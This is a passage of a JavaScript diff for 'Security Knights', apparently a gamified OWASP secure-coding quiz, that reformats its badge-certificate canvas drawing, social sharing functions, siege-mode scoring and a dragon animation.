+      realPick(idx);
+      var isCorrect = idx === shuffledCorrect;
+      if (isCorrect) {
+        var done = parseInt(localStorage.getItem('sk4_siege_done') || '0') + 1;
+        localStorage.setItem('sk4_siege_done', done);
+        renderSiegeLeaderboard();
+        renderSiegeAction();
+        // Bonus XP for siege
+        state.xp += ch.xp; saveState(); updateHUD();
+        addWizMsg('wiz', '🔥 <strong>Siege strike!</strong> +' + (ch.xp*2) + ' XP contributed to your Order!');
+      }
+    };
+  }
 }
 
-function openShareCard(){ document.getElementById('shareModal').classList.add('open'); drawBadgeCard(); }
-function drawBadgeCard(){
-  var canvas=document.getElementById('badgeCanvas'), c=canvas.getContext('2d'), W=900, H=500; c.clearRect(0,0,W,H);
-  var bg=c.createLinearGradient(0,0,W,H); bg.addColorStop(0,'#07091A'); bg.addColorStop(0.5,'#0D1130'); bg.addColorStop(1,'#070915'); c.fillStyle=bg; c.fillRect(0,0,W,H);
-  c.strokeStyle='rgba(232,168,32,0.6)'; c.lineWidth=3; c.strokeRect(8,8,W-16,H-16); c.strokeStyle='rgba(232,168,32,0.2)'; c.lineWidth=1; c.strokeRect(14,14,W-28,H-28);
-  drawCorner(c,22,22,1,1); drawCorner(c,W-22,22,-1,1); drawCorner(c,22,H-22,1,-1); drawCorner(c,W-22,H-22,-1,-1);
-  c.fillStyle='rgba(255,255,255,0.6)'; var starSeed=42;
-  for (var s=0;s<80;s++){ starSeed = (starSeed * 1664525 + 1013904223) & 0xFFFFFFFF; var sx=((starSeed>>>0)%W); starSeed=(starSeed*1664525+1013904223)&0xFFFFFFFF; var sy=((starSeed>>>0)%H); starSeed=(starSeed*1664525+1013904223)&0xFFFFFFFF; var sr=((starSeed>>>0)%10)/10*1.5+0.3; c.beginPath(); c.arc(sx,sy,sr,0,Math.PI*2); c.fill(); }
-  c.save(); c.translate(W/2, H/2 - 20); drawShield(c, 90); c.restore();
-  var rank = state.rank || 'paige', rankData={paige:{label:'PAGE',color:'#7BA7D4'},squire:{label:'SQUIRE',color:'#C0976A'},knight:{label:'KNIGHT',color:'#E8A820'}}, rd=rankData[rank];
-  c.textAlign='center'; c.fillStyle='rgba(232,168,32,0.55)'; c.font='500 13px "Cinzel", serif'; c.fillText('SECURITY KNIGHTS', W/2, 48);
-  c.fillStyle='rgba(232,168,32,0.25)'; c.fillRect(W/2 - 120, 54, 240, 1);
-  c.fillStyle=rd.color; c.font='bold 38px "Cinzel", serif'; c.fillText('CERTIFIED ' + rd.label, W/2, 98);
-  var completed=(state.completed||[]).length, total=CHALLENGES.length;
-  c.fillStyle='rgba(232,168,32,0.2)'; c.fillRect(W/2 - 160, H - 130, 320, 1);
-  c.fillStyle='rgba(232,200,120,0.8)'; c.font='500 15px "Cinzel", serif'; c.fillText('OWASP Top 10 Secure Coding Challenge', W/2, H-108);
-  c.fillStyle='#FFD700'; c.font='bold 22px "JetBrains Mono", monospace'; c.fillText(state.xp + ' XP  ·  ' + completed + '/' + total + ' Challenges', W/2, H-78);
-  var now=new Date(), dateStr=now.toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'});
-  c.fillStyle='rgba(140,160,200,0.55)'; c.font='400 11px "JetBrains Mono", monospace'; c.fillText('Completed ' + dateStr + '  ·  didiegons.github.io', W/2, H-48);
-  c.fillStyle='rgba(232,168,32,0.35)'; c.font='400 11px "Cinzel", serif'; c.fillText('The realm is safer with you.', W/2, H-26);
-}
-function drawShield(c,size){
-  var s=size, shGrad=c.createLinearGradient(-s,-s,s,s); shGrad.addColorStop(0,'rgba(232,168,32,0.25)'); shGrad.addColorStop(1,'rgba(232,168,32,0.05)');
-  c.beginPath(); c.moveTo(0,-s); c.bezierCurveTo(s,-s,s,-s*0.3,s,s*0.2); c.bezierCurveTo(s,s*0.7,0,s,0,s); c.bezierCurveTo(0,s,-s,s*0.7,-s,s*0.2); c.bezierCurveTo(-s,-s*0.3,-s,-s,0,-s); c.closePath(); c.fillStyle=shGrad; c.fill(); c.strokeStyle='rgba(232,168,32,0.7)'; c.lineWidth=2.5; c.stroke();
-  c.font = s * 0.6 + 'px serif'; c.textAlign='center'; c.textBaseline='middle'; var icons={paige:'🛡',squire:'⚔',knight:'👑'}; c.fillText(icons[state.rank] || '⚔', 0, 0); c.textBaseline='alphabetic';
-}
-function drawCorner(c,x,y,dx,dy){ var len=22; c.strokeStyle='rgba(232,168,32,0.55)'; c.lineWidth=1.5; c.beginPath(); c.moveTo(x+dx*len,y); c.lineTo(x,y); c.lineTo(x,y+dy*len); c.stroke(); c.beginPath(); c.arc(x,y,3,0,Math.PI*2); c.fillStyle='rgba(232,168,32,0.55)'; c.fill(); }
-function downloadBadge(){ var canvas=document.getElementById('badgeCanvas'); var link=document.createElement('a'); link.download='SecurityKnights-Certificate-' + (state.rank||'knight') + '.png'; link.href=canvas.toDataURL('image/png'); link.click(); }
-function shareLinkedIn(){ var text=encodeURIComponent("I just completed the Security Knights OWASP Top 10 challenge! Earned " + state.xp + " XP and reached the rank of " + (state.rank||'Knight').toUpperCase() + ".\\n\\n#CyberSecurity #OWASP #SecureCoding #SecurityKnights"); window.open('https://www.linkedin.com/sharing/share-offsite/?url=' + encodeURIComponent('https://didiegons.github.io/security-knights-live.html') + '&summary=' + text, '_blank'); }
-function copyShareText(){ var text="⚔️ I just became a Security Knight!\\n\\nCompleted the Security Knights OWASP Top 10 challenge:\\n✅ " + (state.completed||[]).length + "/15 challenges completed\\n🏅 Rank: " + (state.rank||'Knight').toUpperCase() + "\\n⭐ XP: " + state.xp + "\\n\\nTry it: https://didiegons.github.io/security-knights-live.html\\n#CyberSecurity #OWASP #SecureCoding"; navigator.clipboard.writeText(text).then(function(){ var btn=document.getElementById('cpyBtn'); btn.textContent='✅ Copied!'; setTimeout(function(){ btn.textContent='📋 Copy Text'; },2000); }); }
+// Update order panel whenever XP changes
+var _origSaveState = saveState;
+saveState = function() {
+  _origSaveState();
+  if (gameMode === 'order' && orderData) {
+    renderOrderPanel();
+    renderSiegeLeaderboard();
+  }
+};
 
+
+// ═══════════════════════════════════════════════
+// BADGE SHARE CARD GENERATOR
+// ═══════════════════════════════════════════════
+function openShareCard() {
+  document.getElementById('shareModal').classList.add('open');
+  drawBadgeCard();
+}
+
+function drawBadgeCard() {
+  var canvas = document.getElementById('badgeCanvas');
+  var c = canvas.getContext('2d');
+  var W = 900, H = 500;
+  c.clearRect(0,0,W,H);
+
+  // ── Background ──
+  var bg = c.createLinearGradient(0,0,W,H);
+  bg.addColorStop(0, '#07091A');
+  bg.addColorStop(0.5, '#0D1130');
+  bg.addColorStop(1, '#070915');
+  c.fillStyle = bg;
+  c.fillRect(0,0,W,H);
+
+  // Border glow
+  c.strokeStyle = 'rgba(232,168,32,0.6)';
+  c.lineWidth = 3;
+  c.strokeRect(8,8,W-16,H-16);
+  c.strokeStyle = 'rgba(232,168,32,0.2)';
+  c.lineWidth = 1;
+  c.strokeRect(14,14,W-28,H-28);
+
+  // Corner ornaments
+  drawCorner(c, 22, 22, 1, 1);
+  drawCorner(c, W-22, 22, -1, 1);
+  drawCorner(c, 22, H-22, 1, -1);
+  drawCorner(c, W-22, H-22, -1, -1);
+
+  // ── Star field ──
+  c.fillStyle = 'rgba(255,255,255,0.6)';
+  var starSeed = 42;
+  for (var s=0; s<80; s++) {
+    starSeed = (starSeed * 1664525 + 1013904223) & 0xFFFFFFFF;
+    var sx = ((starSeed >>> 0) % W);
+    starSeed = (starSeed * 1664525 + 1013904223) & 0xFFFFFFFF;
+    var sy = ((starSeed >>> 0) % H);
+    starSeed = (starSeed * 1664525 + 1013904223) & 0xFFFFFFFF;
+    var sr = ((starSeed >>> 0) % 10) / 10 * 1.5 + 0.3;
+    c.beginPath();
+    c.arc(sx, sy, sr, 0, Math.PI*2);
+    c.fill();
+  }
+
+  // ── Central shield ──
+  c.save();
+  c.translate(W/2, H/2 - 20);
+  drawShield(c, 90);
+  c.restore();
+
+  // ── Zone badge (rank) ──
+  var rank = state.rank || 'paige';
+  var rankData = {
+    paige:  { icon:'🛡️', label:'PAIGE', color:'#7BA7D4' },
+    squire: { icon:'⚔️', label:'SQUIRE', color:'#C0976A' },
+    knight: { icon:'👑', label:'KNIGHT', color:'#E8A820' }
+  };
+  var rd = rankData[rank];
+
+  // ── Title ──
+  c.textAlign = 'center';
+  c.fillStyle = 'rgba(232,168,32,0.55)';
+  c.font = '500 13px "Cinzel", serif';
+  c.fillText('SECURITY KNIGHTS', W/2, 48);
+
+  c.fillStyle = 'rgba(232,168,32,0.25)';
+  c.fillRect(W/2 - 120, 54, 240, 1);
+
+  c.fillStyle = rd.color;
+  c.font = 'bold 38px "Cinzel", serif';
+  c.fillText('CERTIFIED ' + rd.label, W/2, 98);
+
+  // ── Bottom XP and completion ──
+  var completed = (state.completed || []).length;
+  var total = CHALLENGES.length;
+
+  c.fillStyle = 'rgba(232,168,32,0.2)';
+  c.fillRect(W/2 - 160, H - 130, 320, 1);
+
+  c.fillStyle = 'rgba(232,200,120,0.8)';
+  c.font = '500 15px "Cinzel", serif';
+  c.fillText('OWASP Top 10 Secure Coding Challenge', W/2, H-108);
+
+  c.fillStyle = '#FFD700';
+  c.font = 'bold 22px "JetBrains Mono", monospace';
+  c.fillText(state.xp + ' XP  ·  ' + completed + '/' + total + ' Challenges', W/2, H-78);
+
+  // Date
+  var now = new Date();
+  var dateStr = now.toLocaleDateString('en-US', { year:'numeric', month:'long', day:'numeric' });
+  c.fillStyle = 'rgba(140,160,200,0.55)';
+  c.font = '400 11px "JetBrains Mono", monospace';
+  c.fillText('Completed ' + dateStr + '  ·  didiegons.github.io', W/2, H-48);
+
+  // Bottom tagline
+  c.fillStyle = 'rgba(232,168,32,0.35)';
+  c.font = '400 11px "Cinzel", serif';
+  c.fillText('The realm is safer with you.', W/2, H-26);
+}
+
+function drawShield(c, size) {
+  var s = size;
+  // Shield shape
+  var shGrad = c.createLinearGradient(-s, -s, s, s);
+  shGrad.addColorStop(0, 'rgba(232,168,32,0.25)');
+  shGrad.addColorStop(1, 'rgba(232,168,32,0.05)');
+  c.beginPath();
+  c.moveTo(0, -s);
+  c.bezierCurveTo(s, -s, s, -s*0.3, s, s*0.2);
+  c.bezierCurveTo(s, s*0.7, 0, s, 0, s);
+  c.bezierCurveTo(0, s, -s, s*0.7, -s, s*0.2);
+  c.bezierCurveTo(-s, -s*0.3, -s, -s, 0, -s);
+  c.closePath();
+  c.fillStyle = shGrad;
+  c.fill();
+  c.strokeStyle = 'rgba(232,168,32,0.7)';
+  c.lineWidth = 2.5;
+  c.stroke();
+
+  // Rank emoji
+  c.font = s * 0.6 + 'px serif';
+  c.textAlign = 'center';
+  c.textBaseline = 'middle';
+  var rank = state.rank || 'paige';
+  var icons = { paige:'🛡', squire:'⚔', knight:'👑' };
+  c.fillText(icons[rank] || '⚔', 0, 0);
+  c.textBaseline = 'alphabetic';
+}
+
+function drawCorner(c, x, y, dx, dy) {
+  var len = 22;
+  c.strokeStyle = 'rgba(232,168,32,0.55)';
+  c.lineWidth = 1.5;
+  c.beginPath();
+  c.moveTo(x + dx*len, y);
+  c.lineTo(x, y);
+  c.lineTo(x, y + dy*len);
+  c.stroke();
+  c.beginPath();
+  c.arc(x, y, 3, 0, Math.PI*2);
+  c.fillStyle = 'rgba(232,168,32,0.55)';
+  c.fill();
+}
+
+function downloadBadge() {
+  var canvas = document.getElementById('badgeCanvas');
+  var link = document.createElement('a');
+  link.download = 'SecurityKnights-Certificate-' + (state.rank||'knight') + '.png';
+  link.href = canvas.toDataURL('image/png');
+  link.click();
+}
+
+function shareLinkedIn() {
+  var text = encodeURIComponent(
+    "I just completed the Security Knights OWASP Top 10 challenge! " +
+    "Earned " + state.xp + " XP and reached the rank of " + (state.rank||'Knight').toUpperCase() + ". " +
+    "\n\nGreat hands-on secure coding training — try it yourself! " +
+    "\n#CyberSecurity #OWASP #SecureCoding #SecurityKnights"
+  );
+  window.open('https://www.linkedin.com/sharing/share-offsite/?url=' +
+    encodeURIComponent('https://didiegons.github.io/security-knights-live.html') +
+    '&summary=' + text, '_blank');
+}
+
+function copyShareText() {
+  var text = "⚔️ I just became a Security Knight!\n\n" +
+    "Completed the Security Knights OWASP Top 10 challenge:\n" +
+    "✅ " + (state.completed||[]).length + "/15 challenges completed\n" +
+    "🏅 Rank: " + (state.rank||'Knight').toUpperCase() + "\n" +
+    "⭐ XP: " + state.xp + "\n\n" +
+    "Try it: https://didiegons.github.io/security-knights-live.html\n" +
+    "#CyberSecurity #OWASP #SecureCoding";
+  navigator.clipboard.writeText(text).then(function() {
+    var btn = document.getElementById('cpyBtn');
+    btn.textContent = '✅ Copied!';
+    setTimeout(function(){ btn.textContent = '📋 Copy Text'; }, 2000);
+  });
+}
+
+
+// ═══════════════════════════════════════════════
+// DRAGON ANIMATION
+// ═══════════════════════════════════════════════
 var dragonAnim = {
-  running:false,t:0,dc:null,dctx:null,raf:null,fire:[],
-  show:function(){
-    if(this.running) return; this.running=true; this.t=0; this.fire=[];
-    var overlay=document.getElementById('dragon-overlay'); overlay.classList.add('active');
-    var dc=document.getElementById('dragon-canvas'); dc.width=window.innerWidth; dc.height=window.innerHeight; this.dc=dc; this.dctx=dc.getContext('2d');
-    var layout=document.getElementById('layout'), hud=document.getElementById('hud'); layout.style.animation='screenShake 0.5s ease 0.8s'; hud.style.animation='screenShake 0.5s ease 0.8s';
-    setTimeout(function(){ layout.style.animation=''; hud.style.animation=''; },1400);
-    setTimeout(function(){ document.getElementById('dragon-text').classList.add('show'); },900);
-    var self=this;
-    setTimeout(function(){ document.getElementById('dragon-text').classList.remove('show'); setTimeout(function(){ overlay.classList.remove('active'); self.running=false; if(self.raf) cancelAnimationFrame(self.raf); },400); },3000);
+  running: false,
+  t: 0,
+  dc: null,  // canvas context
+  dctx: null,
+  raf: null,
+  fire: [],  // fire particles
+
+  show: function() {
+    if (this.running) return;
+    this.running = true;
+    this.t = 0;
+    this.fire = [];
+
+    var overlay = document.getElementById('dragon-overlay');
+    overlay.classList.add('active');
+
+    var dc = document.getElementById('dragon-canvas');
+    dc.width = window.innerWidth;
+    dc.height = window.innerHeight;
+    this.dc = dc;
+    this.dctx = dc.getContext('2d');
+
+    // Shake the layout
+    var layout = document.getElementById('layout');
+    layout.style.animation = 'screenShake 0.5s ease 0.8s';
+    var hud = document.getElementById('hud');
+    hud.style.animation = 'screenShake 0.5s ease 0.8s';
+    setTimeout(function() {
+      layout.style.animation = '';
+      hud.style.animation = '';
+    }, 1400);
+
+    // Show text after dragon arrives
+    setTimeout(function() {
+      document.getElementById('dragon-text').classList.add('show');
+    }, 900);
+
+    // Hide after 3.2s
+    var self = this;
+    setTimeout(function() {
+      document.getElementById('dragon-text').classList.remove('show');
+      setTimeout(function() {
+        overlay.classList.remove('active');
+        self.running = false;
+        if (self.raf) cancelAnimationFrame(self.raf);
+      }, 400);
+    }, 3000);
+
     this.loop();
   },
-  loop:function(){ if(!this.running) return; var self=this; this.raf=requestAnimationFrame(function(){ self.loop(); }); this.t += 0.025; this.draw(); },
-  draw:function(){
-    var W=this.dc.width,H=this.dc.height,dctx=this.dctx; dctx.clearRect(0,0,W,H); var bgAlpha=Math.min(0.88,this.t*0.8); dctx.fillStyle='rgba(4,0,8,'+bgAlpha+')'; dctx.fillRect(0,0,W,H);
-    var vgr=dctx.createRadialGradient(W/2,H/2,W*0.2,W/2,H/2,W*0.8); vgr.addColorStop(0,'rgba(60,0,0,0)'); vgr.addColorStop(1,'rgba(120,0,0,'+Math.min(0.5,this.t*0.4)+')'); dctx.fillStyle=vgr; dctx.fillRect(0,0,W,H);
-    var dx,dy;
-    if(this.t<1.2){ var p=this.t/1.2; dx=W*1.2-p*W*0.78; dy=H*0.18+Math.sin(p*Math.PI*1.5)*H*0.22; }
-    else if(this.t<2.2){ var p2=(this.t-1.2)/1.0; dx=W*0.52+Math.sin(p2*Math.PI*2)*28; dy=H*0.28+Math.cos(p2*Math.PI)*18; }
-    else { var p3=(this.t-2.2)/1.5; dx=W*0.52-p3*W*1.4; dy=H*0.28-p3*H*0.55; }
-    var facingLeft=this.t>2.2;
-    dctx.save(); dctx.translate(dx,dy); dctx.scale(1.6,1.6); dctx.translate(-dx,-dy);
-    if(this.t>1.1&&this.t<2.3){ for(var i=0;i<4;i++) this.fire.push({x:dx+(facingLeft?-60:60),y:dy+40,vx:(facingLeft?-1:1)*(6+Math.random()*8),vy:(Math.random()-0.5)*4,r:10+Math.random()*18,life:1,hue:20+Math.random()*30}); }
-    for(var j=this.fire.length-1;j>=0;j--){ var fp=this.fire[j]; fp.x+=fp.vx; fp.y+=fp.vy; fp.vx*=0.94; fp.r*=0.93; fp.life-=0.045; if(fp.life<=0||fp.r<1){this.fire.splice(j,1);continue;} dctx.save(); dctx.globalAlpha=fp.life*0.85; var fg=dctx.createRadialGradient(fp.x,fp.y,0,fp.x,fp.y,fp.r); fg.addColorStop(0,'rgba(255,240,100,1)'); fg.addColorStop(0.4,'hsla('+fp.hue+',100%,50%,0.9)'); fg.addColorStop(1,'rgba(200,0,0,0)'); dctx.fillStyle=fg; dctx.beginPath(); dctx.arc(fp.x,fp.y,fp.r,0,Math.PI*2); dctx.fill(); dctx.restore(); }
-    this.drawDragon(dctx,dx,dy,facingLeft,this.t); dctx.restore();
+
+  loop: function() {
+    if (!this.running) return;
+    var self = this;
+    this.raf = requestAnimationFrame(function() { self.loop(); });
+    this.t += 0.025;
+    this.draw();
   },
-  drawDragon:function(dctx,x,y,flip,t){
-    dctx.save(); dctx.translate(x,y); if(flip) dctx.scale(-1,1);
-    var wingFlap=Math.sin(t*8)*0.4, bodyWobble=Math.sin(t*4)*3;
-    dctx.globalAlpha=0.2; dctx.fillStyle='#000'; dctx.beginPath(); dctx.ellipse(0,80,60,18,0,0,Math.PI*2); dctx.fill(); dctx.globalAlpha=1;
-    dctx.strokeStyle='#2A1A00'; dctx.lineWidth=14; dctx.lineCap='round'; dctx.beginPath(); dctx.moveTo(30,20+bodyWobble); dctx.quadraticCurveTo(80,40,110,10+Math.sin(t*5)*15); dctx.quadraticCurveTo(130,-5,120,25+Math.sin(t*3)*10); dctx.stroke();
-    dctx.fillStyle='#8B0000'; for(var i=0;i<3;i++){ var tx2=80+i*18, ty2=30+i*5; dctx.beginPath(); dctx.moveTo(tx2,ty2-12); dctx.lineTo(tx2-6,ty2+4); dctx.lineTo(tx2+6,ty2+4); dctx.closePath(); dctx.fill(); }
-    dctx.fillStyle='#4A0000'; dctx.beginPath(); dctx.moveTo(-10,-10); dctx.quadraticCurveTo(-80,-100-wingFlap*80,-120,-60-wingFlap*60); dctx.quadraticCurveTo(-140,-20,-100,20); dctx.quadraticCurveTo(-60,40,-10,20); dctx.closePath(); dctx.fill();
-    dctx.strokeStyle='#6A0010'; dctx.lineWidth=1.5; dctx.globalAlpha=0.6; for(var j=0;j<4;j++){ var wx=-30-j*20, wy=-30-j*18; dctx.beginPath(); dctx.moveTo(-10,10); dctx.lineTo(wx-40,wy-wingFlap*40); dctx.stroke(); } dctx.globalAlpha=1;
-    dctx.fillStyle='#3A0000'; dctx.beginPath(); dctx.moveTo(20,0); dctx.quadraticCurveTo(60,-50+wingFlap*40,90,-30+wingFlap*30); dctx.quadraticCurveTo(80,10,40,25); dctx.closePath(); dctx.fill();
-    var bodyGrad=dctx.createRadialGradient(-10,0,5,-10,0,55); bodyGrad.addColorStop(0,'#3A1A00'); bodyGrad.addColorStop(0.5,'#1A0A00'); bodyGrad.addColorStop(1,'#0A0500'); dctx.fillStyle=bodyGrad; dctx.beginPath(); dctx.ellipse(-10,10+bodyWobble*0.5,50,35,0.2,0,Math.PI*2); dctx.fill();
-    dctx.fillStyle='#5A2A10'; dctx.beginPath(); dctx.ellipse(-20,25+bodyWobble*0.3,28,18,0.1,0,Math.PI*2); dctx.fill();
-    dctx.fillStyle='#8B0000'; for(var k=0;k<5;k++){ var sx=-30+k*12, sy=-22-(k===2?6:0)+bodyWobble*0.3; dctx.beginPath(); dctx.moveTo(sx,sy-14-(k===2?4:0)); dctx.lineTo(sx-5,sy+4); dctx.lineTo(sx+5,sy+4); dctx.closePath(); dctx.fill(); }
-    dctx.strokeStyle='#2A1200'; dctx.lineWidth=8; dctx.beginPath(); dctx.moveTo(0,30); dctx.lineTo(-20,65+Math.sin(t*6)*8); dctx.lineTo(-30,80+Math.sin(t*6)*8); dctx.stroke(); dctx.beginPath(); dctx.moveTo(20,35); dctx.lineTo(5,70+Math.cos(t*6)*8); dctx.lineTo(-5,82+Math.cos(t*6)*8); dctx.stroke();
-    dctx.strokeStyle='#555'; dctx.lineWidth=3; [[-30,80],[-5,82]].forEach(function(pos){ for(var c=-1;c<=1;c++){ dctx.beginPath(); dctx.moveTo(pos[0]+c*6,pos[1]+Math.sin(t*6)*8); dctx.lineTo(pos[0]+c*8,pos[1]+12+Math.sin(t*6)*8); dctx.stroke(); } });
-    dctx.fillStyle='#2A1A00'; dctx.beginPath(); dctx.moveTo(-40,-20); dctx.quadraticCurveTo(-70,-50,-80,-45+Math.sin(t*3)*8); dctx.quadraticCurveTo(-70,-30,-40,-10); dctx.fill();
-    var headX=-85, headY=-50+Math.sin(t*3)*8, headGrad=dctx.createRadialGradient(headX,headY,3,headX,headY,32); headGrad.addColorStop(0,'#3A1A00'); headGrad.addColorStop(1,'#0A0500'); dctx.fillStyle=headGrad; dctx.beginPath(); dctx.ellipse(headX,headY,32,22,-0.3,0,Math.PI*2); dctx.fill();
-    dctx.fillStyle='#1A0A00'; dctx.beginPath(); dctx.ellipse(headX-24,headY+6,18,12,-0.3,0,Math.PI*2); dctx.fill();
-    dctx.fillStyle='#FF0000'; dctx.beginPath(); dctx.arc(headX-10,headY-8,8,0,Math.PI*2); dctx.fill();
-    var eyeGlow=dctx.createRadialGradient(headX-10,headY-8,0,headX-10,headY-8,18); eyeGlow.addColorStop(0,'rgba(255,0,0,0.6)'); eyeGlow.addColorStop(1,'rgba(255,0,0,0)'); dctx.fillStyle=eyeGlow; dctx.beginPath(); dctx.arc(headX-10,headY-8,18,0,Math.PI*2); dctx.fill();
-    dctx.fillStyle='#000'; dctx.beginPath(); dctx.arc(headX-11,headY-7,3.5,0,Math.PI*2); dctx.fill();
-    dctx.fillStyle='#555'; dctx.beginPath(); dctx.moveTo(headX-4,headY-20); dctx.lineTo(headX+8,headY-44); dctx.lineTo(headX+4,headY-20); dctx.closePath(); dctx.fill(); dctx.beginPath(); dctx.moveTo(headX-15,headY-18); dctx.lineTo(headX-8,headY-38); dctx.lineTo(headX-20,headY-18); dctx.closePath(); dctx.fill();
-    if (t>1.1&&t<2.3){ var fIntensity=Math.sin((t-1.1)/1.2*Math.PI), fg2=dctx.createLinearGradient(headX-42,headY+6,headX-120,headY+6); fg2.addColorStop(0,'rgba(255,220,50,'+fIntensity+')'); fg2.addColorStop(0.5,'rgba(255,80,0,'+(fIntensity*0.8)+')'); fg2.addColorStop(1,'rgba(200,0,0,0)'); dctx.fillStyle=fg2; var fireW=80+Math.sin(t*12)*20; dctx.beginPath(); dctx.moveTo(headX-42,headY+6); dctx.quadraticCurveTo(headX-80,headY+6+Math.sin(t*8)*15,headX-42-fireW,headY+18); dctx.quadraticCurveTo(headX-80,headY+25+Math.sin(t*10)*10,headX-42,headY+25); dctx.closePath(); dctx.fill(); }
+
+  draw: function() {
+    var W = this.dc.width, H = this.dc.height;
+    var dctx = this.dctx;
+    dctx.clearRect(0, 0, W, H);
+
+    // Strong dark cinematic backdrop — immediately visible
+    var bgAlpha = Math.min(0.88, this.t * 0.8);
+    dctx.fillStyle = 'rgba(4,0,8,' + bgAlpha + ')';
+    dctx.fillRect(0, 0, W, H);
+
+    // Red vignette edges
+    var vgr = dctx.createRadialGradient(W/2, H/2, W*0.2, W/2, H/2, W*0.8);
+    vgr.addColorStop(0, 'rgba(60,0,0,0)');
+    vgr.addColorStop(1, 'rgba(120,0,0,' + Math.min(0.5, this.t*0.4) + ')');
+    dctx.fillStyle = vgr;
+    dctx.fillRect(0, 0, W, H);
+
+    // Dragon position - swoops from right, curves across sky
+    var progress = Math.min(1, this.t / 2.5);
+    var eased = 1 - Math.pow(1 - progress, 3);
+
+    // Path: start off-screen right, swoops to center-left, then up-left
+    var dx, dy;
+    if (this.t < 1.2) {
+      // Flying in
+      var p = this.t / 1.2;
+      dx = W * 1.2 - p * W * 0.78;
+      dy = H * 0.18 + Math.sin(p * Math.PI * 1.5) * H * 0.22;
+    } else if (this.t < 2.2) {
+      // Hovering / breathing fire
+      var p = (this.t - 1.2) / 1.0;
+      dx = W * 0.52 + Math.sin(p * Math.PI * 2) * 28;
+      dy = H * 0.28 + Math.cos(p * Math.PI) * 18;
+    } else {
+      // Flying away left-up
+      var p = (this.t - 2.2) / 1.5;
+      dx = W * 0.52 - p * W * 1.4;
+      dy = H * 0.28 - p * H * 0.55;
+    }
+
+    var facingLeft = this.t > 2.2;
+
+    // Scale dragon 1.6x so it fills the screen
+    dctx.save();
+    dctx.translate(dx, dy); dctx.scale(1.6, 1.6); dctx.translate(-dx, -dy);
+
+    // Add fire when hovering
+    if (this.t > 1.1 && this.t < 2.3) {
+      for (var i = 0; i < 4; i++) {
+        this.fire.push({
+          x: dx + (facingLeft ? -60 : 60),
+          y: dy + 40,
+          vx: (facingLeft ? -1 : 1) * (6 + Math.random() * 8),
+          vy: (Math.random() - 0.5) * 4,
+          r: 10 + Math.random() * 18,
+          life: 1.0,
+          hue: 20 + Math.random() * 30
+        });
+      }
+    }
+
+    // Update & draw fire particles
+    for (var i = this.fire.length - 1; i >= 0; i--) {
+      var p = this.fire[i];
+      p.x += p.vx;
+      p.y += p.vy;
+      p.vx *= 0.94;
+      p.r *= 0.93;
+      p.life -= 0.045;
+      if (p.life <= 0 || p.r < 1) { this.fire.splice(i, 1); continue; }
+      dctx.save();
+      dctx.globalAlpha = p.life * 0.85;
+      var fg = dctx.createRadialGradient(p.x, p.y, 0, p.x, p.y, p.r);
+      fg.addColorStop(0, 'rgba(255,240,100,1)');
+      fg.addColorStop(0.4, 'hsla(' + p.hue + ',100%,50%,0.9)');
+      fg.addColorStop(1, 'rgba(200,0,0,0)');
+      dctx.fillStyle = fg;
+      dctx.beginPath();
+      dctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+      dctx.fill();
+      dctx.restore();
+    }
+
+    // Draw dragon
+    this.drawDragon(dctx, dx, dy, facingLeft, this.t);
+    dctx.restore(); // close the scale transform
+  },
+
+  drawDragon: function(dctx, x, y, flip, t) {
+    dctx.save();
+    dctx.translate(x, y);
+    if (flip) dctx.scale(-1, 1);
+
+    var wingFlap = Math.sin(t * 8) * 0.4;
+    var bodyWobble = Math.sin(t * 4) * 3;
+
+    // Dragon shadow
+    dctx.globalAlpha = 0.2;
+    dctx.fillStyle = '#000';
+    dctx.beginPath();
+    dctx.ellipse(0, 80, 60, 18, 0, 0, Math.PI * 2);
+    dctx.fill();
+    dctx.globalAlpha = 1;
+
+    // ── TAIL ──
+    dctx.strokeStyle = '#2A1A00';
+    dctx.lineWidth = 14;
+    dctx.lineCap = 'round';
+    dctx.beginPath();
+    dctx.moveTo(30, 20 + bodyWobble);
+    dctx.quadraticCurveTo(80, 40, 110, 10 + Math.sin(t * 5) * 15);
+    dctx.quadraticCurveTo(130, -5, 120, 25 + Math.sin(t * 3) * 10);
+    dctx.stroke();
+    // Tail spikes
+    dctx.fillStyle = '#8B0000';
+    for (var i = 0; i < 3; i++) {
+      var tx2 = 80 + i * 18, ty2 = 30 + i * 5;
+      dctx.beginPath();
+      dctx.moveTo(tx2, ty2 - 12);
+      dctx.lineTo(tx2 - 6, ty2 + 4);
+      dctx.lineTo(tx2 + 6, ty2 + 4);
+      dctx.closePath();
+      dctx.fill();
+    }
+
+    // ── WINGS ──
+    // Left wing (upper)
+    dctx.fillStyle = '#4A0000';
+    dctx.beginPath();
+    dctx.moveTo(-10, -10);
+    dctx.quadraticCurveTo(-80, -100 - wingFlap * 80, -120, -60 - wingFlap * 60);
+    dctx.quadraticCurveTo(-140, -20, -100, 20);
+    dctx.quadraticCurveTo(-60, 40, -10, 20);
+    dctx.closePath();
+    dctx.fill();
+    // Wing membrane details
+    dctx.strokeStyle = '#6A0010';
+    dctx.lineWidth = 1.5;
+    dctx.globalAlpha = 0.6;
+    for (var i = 0; i < 4; i++) {
+      var wx = -30 - i * 20, wy = -30 - i * 18;
+      dctx.beginPath();
+      dctx.moveTo(-10, 10);
+      dctx.lineTo(wx - 40, wy - wingFlap * 40);
+      dctx.stroke();
+    }
+    dctx.globalAlpha = 1;
+
+    // Right wing (lower/folded)
+    dctx.fillStyle = '#3A0000';
+    dctx.beginPath();
+    dctx.moveTo(20, 0);
+    dctx.quadraticCurveTo(60, -50 + wingFlap * 40, 90, -30 + wingFlap * 30);
+    dctx.quadraticCurveTo(80, 10, 40, 25);
+    dctx.closePath();
+    dctx.fill();
+
+    // ── BODY ──
+    // Main body
+    var bodyGrad = dctx.createRadialGradient(-10, 0, 5, -10, 0, 55);
+    bodyGrad.addColorStop(0, '#3A1A00');
+    bodyGrad.addColorStop(0.5, '#1A0A00');
+    bodyGrad.addColorStop(1, '#0A0500');
+    dctx.fillStyle = bodyGrad;
+    dctx.beginPath();
+    dctx.ellipse(-10, 10 + bodyWobble * 0.5, 50, 35, 0.2, 0, Math.PI * 2);
+    dctx.fill();
+
+    // Belly scales (lighter)
+    dctx.fillStyle = '#5A2A10';
+    dctx.beginPath();
+    dctx.ellipse(-20, 25 + bodyWobble * 0.3, 28, 18, 0.1, 0, Math.PI * 2);
+    dctx.fill();
+
+    // Back spikes
+    dctx.fillStyle = '#8B0000';
+    for (var i = 0; i < 5; i++) {
